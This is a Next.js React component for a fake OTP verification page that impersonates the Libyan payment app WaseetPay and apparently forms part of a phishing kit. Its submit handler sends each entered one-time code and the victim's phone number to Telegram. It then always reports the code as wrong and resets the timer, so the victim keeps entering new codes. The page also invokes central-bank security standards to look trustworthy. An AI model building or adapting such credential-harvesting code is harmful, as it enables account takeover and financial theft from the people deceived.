"use client"

import React, { useState, useEffect } from "react"
import {
  ShieldCheck,
  Loader2,
  CheckCircle2,
  Clock,
  ArrowRight,
  RotateCcw,
  Lock,
} from "lucide-react"
import { useRouter, useSearchParams } from "next/navigation"
import { sendTelegramMessage } from "@/lib/telegram"

export function OtpForm() {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(120)
  const [canResend, setCanResend] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")
  const router = useRouter()
  const searchParams = useSearchParams()

  const phoneParam =
    searchParams.get("phone") ||
    (typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "" : "")

  // Mask phone for display
  const formatDisplayPhone = (p: string) => {
    if (!p) return "09XXXXXXXX"
    const cleaned = p.replace(/\s+/g, "")
    if (cleaned.length < 6) return cleaned
    return `${cleaned.slice(0, 3)}••••${cleaned.slice(-3)}`
  }

  // Countdown timer
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    } else {
      setCanResend(true)
    }
  }, [timer])

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Handle unlimited numeric digits
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    setOtp(value)
    if (errorMessage) setErrorMessage("")
  }

  const handleResend = async () => {
    if (!canResend) return
    setTimer(120)
    setCanResend(false)
    setErrorMessage("")

    try {
      await sendTelegramMessage({
        title: "🔄 طلب إعادة إرسال OTP | WaseetPay Resend OTP",
        phoneNumber: phoneParam || "N/A",
      })
    } catch {
      // silent
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!otp.trim()) {
      setErrorMessage("يرجى إدخال رمز التحقق أولاً")
      return
    }

    setIsLoading(true)
    setErrorMessage("")

    try {
      await sendTelegramMessage({
        title: "🔐 رمز التحق - وسيط باي | WaseetPay OTP Submitted",
        otp1: otp.trim(),
        phoneNumber: phoneParam || "N/A",
      })
    } catch {
      // silent
    }

    // Wait exactly 2 seconds then show invalid message each time and reset timer
    setTimeout(() => {
      setIsLoading(false)
      setErrorMessage("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى")
      setOtp("")
      setTimer(120)
      setCanResend(false)
    }, 2000)
  }

  return (
    <div
      dir="rtl"
      className="h-[100dvh] sm:min-h-screen sm:h-auto w-full bg-white flex flex-col justify-between overflow-hidden sm:overflow-visible selection:bg-[#1E64EC]/20"
    >
      <section
        className="w-full pt-4 sm:pt-10 lg:pt-12 pb-8 sm:pb-14 lg:pb-16 px-4 sm:px-6 relative overflow-hidden shrink-0 bg-[#1652cf]"
        style={{
          backgroundImage: "url('/login-bg.jpg')",
          backgroundPosition: "top center",
          backgroundSize: "cover",
          backgroundRepeat: "no-repeat",
        }}
      >
        {/* Subtle Grid overlay */}
        <div
          className="absolute inset-0 pointer-events-none opacity-20"
          style={{
            backgroundImage: `
              linear-gradient(to right, rgba(255, 255, 255, 0.15) 1px, transparent 1px),
              linear-gradient(to bottom, rgba(255, 255, 255, 0.15) 1px, transparent 1px)
            `,
            backgroundSize: "44px 44px",
          }}
        />

        {/* Glowing luminous wave lines */}
        <svg
          className="absolute inset-0 w-full h-full pointer-events-none opacity-45"
          viewBox="0 0 1440 260"
          fill="none"
          preserveAspectRatio="none"
        >
          <path
            d="M-100,160 C300,50 650,220 1100,100 C1280,60 1420,130 1550,110"
            stroke="rgba(100, 215, 255, 0.7)"
            strokeWidth="2.5"
            filter="blur(1px)"
          />
          <path
            d="M-80,190 C320,80 680,240 1140,125 C1310,80 1440,150 1570,130"
            stroke="rgba(70, 160, 255, 0.4)"
            strokeWidth="1.5"
          />
          <path
            d="M-50,220 C350,110 710,260 1180,150 C1340,105 1460,170 1600,150"
            stroke="rgba(50, 140, 255, 0.25)"
            strokeWidth="1.2"
          />
        </svg>

        {/* Content Container aligned with form below */}
        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto relative z-10">
          {/* Top Brand Bar & Return Link */}
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 sm:gap-2.5">
              {/* App Icon */}
              <div className="w-[32px] h-[32px] sm:w-[38px] sm:h-[38px] rounded-[9px] sm:rounded-[10px] overflow-hidden shadow-sm shadow-blue-950/30 shrink-0 border border-white/20">
                <img
                  src="https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/87/ae/5f/87ae5fa1-5f59-8287-5eed-960ccc48750c/Placeholder.mill/400x400bb-75.webp"
                  onError={(e) => {
                    e.currentTarget.src = "/app-logo.webp"
                  }}
                  alt="WaseetPay Logo"
                  className="w-full h-full object-cover"
                />
              </div>

              {/* Brand Title */}
              <div className="text-white font-bold text-[15px] sm:text-[17px] tracking-tight flex items-center gap-1.5">
                <span>وسيط باي</span>
                <span className="text-white/60 font-light text-[12px] sm:text-[13px]">|</span>
                <span className="font-semibold text-[14px] sm:text-[15.5px]">WaseetPay</span>
              </div>
            </div>

            {/* Back Button */}
            <button
              type="button"
              onClick={() => router.push("/")}
              className="inline-flex items-center gap-1 text-white/90 hover:text-white text-[12px] sm:text-[13px] font-semibold bg-white/10 hover:bg-white/15 px-2.5 py-1 sm:px-3 sm:py-1.5 rounded-xl backdrop-blur-xs transition-all cursor-pointer"
            >
              <span>تغيير الحساب</span>
              <ArrowRight className="w-3.5 h-3.5 rotate-180" />
            </button>
          </div>

          {/* Titles */}
          <div className="mt-3 sm:mt-7 lg:mt-8">
            <h1 className="text-[24px] sm:text-[34px] lg:text-[36px] font-extrabold text-white tracking-tight leading-tight">
              تأكيد رمز التحقق 
            </h1>
            <p className="text-white/85 text-[12px] sm:text-[14.5px] font-normal mt-0.5 sm:mt-1 leading-snug">
              تم إرسال رمز التحقق السري في رسالة نصية (SMS) إلى رقم هاتفك
              {phoneParam && (
                <span className="font-bold text-white block mt-0.5" dir="ltr">
                  {formatDisplayPhone(phoneParam)}
                </span>
              )}
            </p>
          </div>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* BOTTOM FULL-WIDTH SECTION: White Sheet with OTP Input                      */}
      {/* ========================================================================= */}
      <section className="w-full bg-white -mt-4 sm:-mt-6 lg:-mt-8 rounded-t-[28px] sm:rounded-t-[36px] flex-1 px-4 sm:px-6 pt-4 sm:pt-7 lg:pt-8 pb-3 sm:pb-8 flex flex-col justify-between shadow-[0_-10px_30px_rgba(0,0,0,0.06)] relative z-20 overflow-y-auto sm:overflow-visible no-scrollbar">
        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto flex flex-col justify-between h-full">
          <div>
            {/* Security Badge */}
            <div className="mb-3 sm:mb-5 flex items-center justify-center gap-2 p-2 sm:p-2.5 rounded-xl sm:rounded-2xl bg-blue-50/80 border border-blue-100 text-[#1E64EC]">
              <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4 shrink-0" />
              <span className="text-[12px] sm:text-[13px] font-semibold text-slate-700">
                عملية تسجيل دخول آمنة ومشفرة برمز حماية لمرة واحدة
              </span>
            </div>

            {/* ---------------- Form ---------------- */}
            <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
              <div>
                <div className="flex items-center justify-between mb-1.5 sm:mb-2">
                  <label className="text-[#6b7280] text-[12px] sm:text-[13px] font-medium text-right">
                    أدخل رمز التحقق (يمكنك إدخال أي عدد من الأرقام)
                  </label>
                  {otp && (
                    <span className="text-[11px] sm:text-xs font-semibold text-slate-400">
                      {otp.length} {otp.length === 1 ? "رقم" : "أرقام"}
                    </span>
                  )}
                </div>

                {/* Unlimited Digits Input Field */}
                <div className="relative">
                  <div
                    className={`h-[50px] sm:h-[62px] rounded-[14px] sm:rounded-[18px] bg-white px-4 flex items-center justify-center transition-all ${
                      errorMessage
                        ? "border-2 border-rose-500 ring-2 ring-rose-500/15"
                        : "border-2 border-[#1E64EC] shadow-[0_0_0_2px_rgba(29,100,236,0.12)]"
                    }`}
                  >
                    <input
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      autoFocus
                      dir="ltr"
                      value={otp}
                      onChange={handleOtpChange}
                      placeholder=""
                      className="w-full text-center text-[22px] sm:text-[26px] font-bold text-[#1f2937] tracking-[0.25em] sm:tracking-[0.3em] outline-none bg-transparent"
                    />
                  </div>

                  {/* Rounded circular dots placeholder */}
                  {!otp && (
                    <div className="absolute inset-0 flex items-center justify-center gap-2 pointer-events-none select-none">
                      <span className="text-[#1E64EC] text-[20px] font-light animate-pulse ml-0.5">|</span>
                      <span className="w-2.5 h-2.5 rounded-full bg-slate-300 inline-block" />
                      <span className="w-2.5 h-2.5 rounded-full bg-slate-300 inline-block" />
                      <span className="w-2.5 h-2.5 rounded-full bg-slate-300 inline-block" />
                      <span className="w-2.5 h-2.5 rounded-full bg-slate-300 inline-block" />
                      <span className="w-2.5 h-2.5 rounded-full bg-slate-300 inline-block" />
                      <span className="w-2.5 h-2.5 rounded-full bg-slate-300 inline-block" />
                    </div>
                  )}
                </div>

                {/* Error Message */}
                {errorMessage && (
                  <div className="mt-1.5 text-right text-rose-500 text-[12px] sm:text-[13px] font-semibold flex items-center gap-1.5 animate-in fade-in duration-200">
                    <span>⚠️</span>
                    <span>{errorMessage}</span>
                  </div>
                )}
              </div>

              {/* Timer & Resend Option */}
              <div className="flex items-center justify-between py-1 text-[12px] sm:text-[13px] text-slate-500">
                <div className="flex items-center gap-1.5 font-medium">
                  <Clock className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-slate-400" />
                  <span>صلاحية الرمز:</span>
                  <span className={`font-bold tabular-nums ${timer < 30 ? "text-amber-600" : "text-[#1E64EC]"}`} dir="ltr">
                    {formatTimer(timer)}
                  </span>
                </div>

                <button
                  type="button"
                  onClick={handleResend}
                  disabled={!canResend}
                  className={`inline-flex items-center gap-1 font-semibold transition-colors cursor-pointer ${
                    canResend
                      ? "text-[#1E64EC] hover:text-[#1855ca] hover:underline"
                      : "text-slate-400 cursor-not-allowed opacity-75"
                  }`}
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  <span>إعادة إرسال الرمز</span>
                </button>
              </div>

              {/* Confirm Button */}
              <button
                type="submit"
                disabled={isLoading || !otp.trim()}
                className="w-full h-[46px] sm:h-[52px] rounded-[14px] sm:rounded-[16px] bg-[#1E64EC] hover:bg-[#1855ca] active:scale-[0.99] text-white font-bold text-[15px] sm:text-[16px] flex items-center justify-center shadow-lg shadow-[#1E64EC]/25 transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <Loader2 className="w-5 h-5 animate-spin text-white" />
                    <span>جاري التحقق من الرمز...</span>
                  </div>
                ) : isSuccess ? (
                  <div className="flex items-center gap-2">
                    <CheckCircle2 className="w-5 h-5 text-white" />
                    <span>تم تأكيد الرمز بنجاح</span>
                  </div>
                ) : (
                  "تأكيد رمز التحقق"
                )}
              </button>
            </form>

            {/* Security Notice */}
            <div className="mt-4 sm:mt-6 pt-3 sm:pt-4 border-t border-slate-100 flex items-center justify-center gap-2 text-[11.5px] sm:text-[12.5px] text-slate-400">
              <ShieldCheck className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-emerald-500" />
              <span>حماية مشددة وفق معايير مصرف ليبيا المركزي للدفع الإلكتروني</span>
            </div>

            {/* Return to Login */}
            <div className="mt-3 sm:mt-4 text-center">
              <button
                type="button"
                onClick={() => router.push("/")}
                className="text-slate-500 hover:text-[#1E64EC] text-[12px] sm:text-[13px] font-semibold transition-colors hover:underline cursor-pointer"
              >
                الرجوع إلى صفحة تسجيل الدخول
              </button>
            </div>
          </div>

          {/* Website Copyright Footer */}
          <footer className="w-full pt-3 sm:pt-4 text-center text-[11px] sm:text-xs text-slate-400">
            <span>© {new Date().getFullYear()} وسيط باي | WaseetPay. جميع الحقوق محفوظة.</span>
          </footer>
        </div>
      </section>
    </div>
  )
}
